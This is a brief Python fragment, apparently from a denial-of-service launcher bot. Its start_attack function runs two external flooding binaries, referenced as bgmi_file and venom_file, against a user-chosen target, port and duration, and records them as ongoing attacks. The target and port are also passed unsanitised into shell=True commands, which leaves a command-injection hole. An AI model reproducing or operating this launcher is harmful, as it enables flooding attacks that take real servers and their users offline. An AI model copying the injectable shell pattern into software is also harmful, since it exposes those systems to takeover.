...
def start_attack(user_id, target, port, duration):
    ...
    try:
        ongoing_attacks[attack_id] = subprocess.Popen(f"./{bgmi_file} {target} {port} {duration} 70", shell=True)
        time.sleep(5)
        subprocess.run(f"./{venom_file} {target} {port} {duration} 70", shell=True)
